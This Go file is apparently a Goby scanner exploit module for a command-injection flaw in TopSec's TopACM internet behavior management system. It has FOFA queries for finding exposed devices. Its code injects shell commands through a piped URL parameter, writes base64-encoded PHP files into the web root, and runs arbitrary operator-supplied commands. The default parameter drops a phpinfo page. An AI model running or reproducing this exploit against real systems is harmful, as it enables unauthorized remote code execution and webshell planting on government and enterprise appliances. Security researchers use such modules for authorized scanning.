package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "TopSec TopACM Remote Command Execution",
    "Description": "<p>Topacm comprehensively considers the needs of customers in various industries and provides customers with practical functions such as security strategy, link load, identity authentication, traffic management, behavior control, online audit, log tracing, network supervision docking, user behavior analysis, VPN, etc. The product has good network adaptability and meets the relevant requirements on user behavior audit and log retention in the network security law, Ministry of public security order 151, etc. At present, the products are widely used in government, education, energy, enterprises, operators and other industries to help customers standardize the network, improve work efficiency, and mine data value.</p><p>There is an arbitrary command execution vulnerability in the TopSec Internet behavior management system. Attackers can execute arbitrary commands on the system, write files, obtain webshell, and read sensitive information.</p><p>Topacm comprehensively considers the needs of customers in various industries and provides customers with practical functions such as security strategy, link load, identity authentication, traffic management, behavior control, online audit, log tracing, network supervision docking, user behavior analysis, VPN, etc. The product has good network adaptability and meets the relevant requirements on user behavior audit and log retention in the network security law, Ministry of public security order 151, etc. At present, the products are widely used in government, education, energy, enterprises, operators and other industries to help customers standardize the network, improve work efficiency, and mine data value.</p><p>There is an arbitrary command execution vulnerability in the TopSec Internet behavior management system. Attackers can execute arbitrary commands on the system, write files, obtain webshell, and read sensitive information.</p>",
    "Impact": "TopSec TopACM Remote Command Execution",
    "Recommendation": "<p>At present, the manufacturer has not released a security patch. Please pay attention to the official update.https://www.topsec.com.cn/product/27.html</p>",
    "Product": "TopSec-TopACM",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "天融信上网行为管理系统命令执行",
            "Description": "<p>天融信上网行为管理系统（TopACM）综合考虑各行业客户需求，为客户提供安全策略、链路负载、身份认证、流量管理、行为管控、上网审计、日志追溯、网监对接、用户行为分析、VPN等实用功能。产品具有良好的网络适应性并满足《网络安全法》、公安部151号令、等保2.0等关于用户行为审计和日志留存的相关要求。目前产品广泛应用于政府、教育、能源、企业、运营商等各类行业，协助客户规范网络、提高工作效率、挖掘数据价值。<br></p><p>天融信上网行为管理系统存在任意命令执行漏洞，攻击者可以在系统上执行任意命令，写入文件，获取webshell，读取敏感信息。<br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">天融信上网行为管理系统存在任意命令执行漏洞，攻击者可以在系统上执行任意命令，写入文件，获取webshell，读取敏感信息。</span><br></p>",
            "Recommendation": "<p>目前厂商还未发布安全补丁，请关注官方更新。<a href=\"https://www.topsec.com.cn/product/27.html\" target=\"_blank\">https://www.topsec.com.cn/product/27.html</a></p>",
            "Product": "天融信-上网行为管理系统",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "TopSec TopACM Remote Command Execution",
            "Description": "<p>Topacm comprehensively considers the needs of customers in various industries and provides customers with practical functions such as security strategy, link load, identity authentication, traffic management, behavior control, online audit, log tracing, network supervision docking, user behavior analysis, VPN, etc.&nbsp;The product has good network adaptability and meets the relevant requirements on user behavior audit and log retention in the network security law, Ministry of public security order 151, etc.&nbsp;At present, the products are widely used in government, education, energy, enterprises, operators and other industries to help customers standardize the network, improve work efficiency, and mine data value.</p><p>There is an arbitrary command execution vulnerability in the TopSec Internet behavior management system. Attackers can execute arbitrary commands on the system, write files, obtain webshell, and read sensitive information.</p><p>Topacm comprehensively considers the needs of customers in various industries and provides customers with practical functions such as security strategy, link load, identity authentication, traffic management, behavior control, online audit, log tracing, network supervision docking, user behavior analysis, VPN, etc. The product has good network adaptability and meets the relevant requirements on user behavior audit and log retention in the network security law, Ministry of public security order 151, etc. At present, the products are widely used in government, education, energy, enterprises, operators and other industries to help customers standardize the network, improve work efficiency, and mine data value.</p><p>There is an arbitrary command execution vulnerability in the TopSec Internet behavior management system. Attackers can execute arbitrary commands on the system, write files, obtain webshell, and read sensitive information.</p>",
            "Impact": "TopSec TopACM Remote Command Execution",
            "Recommendation": "<p><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">At present, the manufacturer has not released a security patch. Please pay attention to the official update.<a href=\"https://www.topsec.com.cn/product/27.html\" target=\"_blank\">https://www.topsec.com.cn/product/27.html</a></span><br></p>",
            "Product": "TopSec-TopACM",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "body=\"ActiveXObject\" && body=\"name=\\\"dkey_login\\\" \" && body=\"repeat-x left top\"",
    "GobyQuery": "body=\"ActiveXObject\" && body=\"name=\\\"dkey_login\\\" \" && body=\"repeat-x left top\"",
    "Author": "su18@javaweb.org",
    "Homepage": "https://www.topsec.com.cn/product/27.html",
    "DisclosureDate": "2022-07-28",
    "References": [
        "https://mp.weixin.qq.com/s/5UMEIrDiG5hQFofByYH78g"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [
        "CNVD-2021-59703"
    ],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "echo%20PD9waHAgcGhwaW5mbygpOw==%20|base64%20-d%20%3E/var/www/html/3.php",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "7101"
}`

	exploitTopACM092348783482 := func(cmd string, host *httpclient.FixUrl) bool {
		requestConfig := httpclient.NewGetRequestConfig("/view/IPV6/naborTable/static_convert.php?blocks[0]=|%20" + url.QueryEscape(cmd))
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Timeout = 15
		if resp, err := httpclient.DoHttpRequest(host, requestConfig); err == nil {
			if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "ip -6 neigh del") {
				return true
			}
		}
		return false
	}
	checkExistFileTopACM092348783482 := func(fileName string, fileContent string, host *httpclient.FixUrl) bool {
		requestConfig := httpclient.NewGetRequestConfig("/" + fileName + ".php")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Timeout = 15
		if resp, err := httpclient.DoHttpRequest(host, requestConfig); err == nil {
			if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, fileContent) {
				return true
			}
		}
		return false
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randomFileName := goutils.RandomHexString(6)
			if exploitTopACM092348783482("echo PD9waHAgZWNobyBtZDUoMjMzKTt1bmxpbmsoX19GSUxFX18pOw== |base64 -d >/var/www/html/"+randomFileName+".php", u) {
				return checkExistFileTopACM092348783482(randomFileName, "e165421110ba03099a1c0393373c5b43", u)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			if exploitTopACM092348783482(cmd, expResult.HostInfo) {
				expResult.Success = true
				expResult.Output = "命令执行成功"
			}
			return expResult
		},
	))
}
